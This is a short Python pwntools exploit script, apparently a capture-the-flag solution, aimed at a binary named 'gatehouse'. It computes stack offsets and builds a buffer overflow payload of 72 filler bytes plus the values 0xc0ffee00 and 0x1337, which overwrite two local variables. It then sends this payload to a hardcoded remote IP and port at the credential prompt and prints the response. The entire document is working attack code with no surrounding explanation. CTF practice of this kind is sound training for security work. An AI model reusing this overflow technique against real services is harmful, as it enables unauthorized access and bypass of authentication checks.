#!/usr/bin/env python3
from pwn import *

# ─── Config ───────────────────────────────────────────────
HOST = "95.216.124.220"
PORT = 30593
BINARY = "./gatehouse"

context.arch = "amd64"
context.log_level = "info"

e = ELF(BINARY, checksec=False)

# ─── Offsets ──────────────────────────────────────────────
# Buffer at rbp-0x50
# rbp-0x8  must == 0xc0ffee00   offset = 0x50 - 0x8 = 72
# rbp-0x4  must == 0x1337       offset = 0x50 - 0x4 = 76

OFFSET_VAR2 = 72   # rbp-0x8  → 0xc0ffee00
OFFSET_VAR1 = 76   # rbp-0x4  → 0x1337

payload  = b"A" * OFFSET_VAR2
payload += p32(0xc0ffee00)   # rbp-0x8
payload += p32(0x1337)       # rbp-0x4

log.info(f"Payload ({len(payload)} bytes): {payload.hex()}")

# ─── Launch ───────────────────────────────────────────────
io = remote(HOST, PORT)

io.recvuntil(b"Enter credential string: ")
io.send(payload)

output = io.recvall(timeout=3)
print()
print(output.decode(errors='replace'))
